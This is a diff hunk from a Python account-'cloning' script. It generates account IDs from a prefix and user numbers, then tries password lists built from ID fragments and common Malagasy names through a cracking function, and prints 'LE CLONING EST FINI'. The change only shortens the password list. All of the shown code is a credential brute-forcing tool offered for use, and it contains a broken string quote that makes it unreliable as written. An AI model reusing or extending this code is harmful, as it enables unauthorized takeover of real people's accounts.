@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nantenaina','Nantenaina','nomena','Nomena', 'rakoto', 'Rakoto', 'diamondra', 'Diamondra', 'fandresena', 'Fandresena', 'gerard', 'Gerard', 'mendrika', 'Mendrika', 'lalaina', 'Antananarivo', 'antananarivo', 'Lalaina', 'rakotomalala', 'Rakotomalala', 'rakotonirina','Rakotonirina','anthonio','Anthonio','ferdinand','Ferdinand,'mahery','Mahery','malagasy','Malagasy','mirah','Mirah','vololona','Vololona','nirina','Nirina','president','President','lalatiana','Lalatiana','mandresy','Mandresy','tsiresy','Tsiresy']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nantenaina','Nantenaina','nomena','Nomena', 'rakoto', 'Rakoto', 'diamondra', 'Diamondra', 'fandresena', 'Fandresena', 'gerard', 'Gerard', 'mendrika', 'Mendrika', 'lalaina', 'Antananarivo', 'antananarivo', 'Lalaina', 'rakotomalala', 'Rakotomalala', 'rakotonirina','Rakotonirina','anthonio','Anthonio','ferdinand','Ferdinand,'mahery','Mahery','malagasy','Malagasy','mirah','Mirah']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' LE CLONING EST FINI ')
